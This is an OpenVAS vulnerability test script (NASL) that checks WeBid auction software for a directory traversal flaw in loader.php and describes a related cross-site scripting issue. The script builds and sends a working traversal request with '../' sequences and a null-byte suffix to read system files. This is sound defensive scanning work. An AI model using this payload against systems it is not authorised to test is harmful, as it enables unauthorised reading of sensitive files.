###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_webid_mult_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# WeBid Multiple Vulnerabilities
#
# Authors:
# Rachana Shetty <srachana@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation could allow attackers to perform directory traversal
  attacks and read arbitrary files on the affected application and execute
  arbitrary script code
  Impact Level: Application";
tag_affected = "WeBid version 1.0.5 and prior";
tag_insight = "The flaws are due to improper input validation
  - Input passed via the 'js' parameter to loader.php, which allows attackers
    to read arbitrary files via a ../(dot dot) sequences.
  - Input passed via the 'Copyright' parameter to admin/settings.php, is not
    properly sanitised before it is returned to the user.";
tag_solution = "No solution or patch is available as on 20th November, 2012. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.webidsupport.com/";
tag_summary = "This host is running WeBid and is prone to directory traversal and multiple
  cross site scripting vulnerabilities.";

if(description)
{
  script_id(803053);
  script_version("$Revision: 12 $");
  script_bugtraq_id(56588);
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-11-20 12:03:19 +0530 (Tue, 20 Nov 2012)");
  script_name("WeBid Multiple Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/80140");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/22828");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/22829");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/118197/webid-traversal.txt");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/115640/WeBid-1.0.4-RFI-File-Disclosure-SQL-Injection.html");

  script_description(desc);
  script_summary("Check for directory traversal vulnerability in WeBid");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

## Get HTTP port
webPort = get_http_port(default:80);
if(!get_port_state(webPort)){
  exit(0);
}

## Check Host Supports PHP
if(!can_host_php(port:webPort)){
  exit(0);
}

foreach dir (make_list("/WeBid", "/webid", "", cgi_dirs()))
{
  url = dir + "/index.php";

  if(http_vuln_check(port:webPort, url:url, pattern:">WeBid<",
                     check_header:TRUE, extra_check:make_list('>Login<',
                     '>Register now','>Sell an item')))
  {
    ## traversal_files() function Returns Dictionary (i.e key value pair)
    ## Get Content to be checked and file to be check
    files = traversal_files();

    foreach file (keys(files))
    {
      ## Construct directory traversal attack
      url = dir + "/loader.php?js=" +
            crap(data:"../",length:3*15) + files[file] + "%00.js;";

      ## Confirm exploit worked properly or not
      if(http_vuln_check(port:webPort, url:url, check_header:TRUE, pattern:file))
      {
        security_hole(webPort);
        exit(0);
      }
    }
  }
}
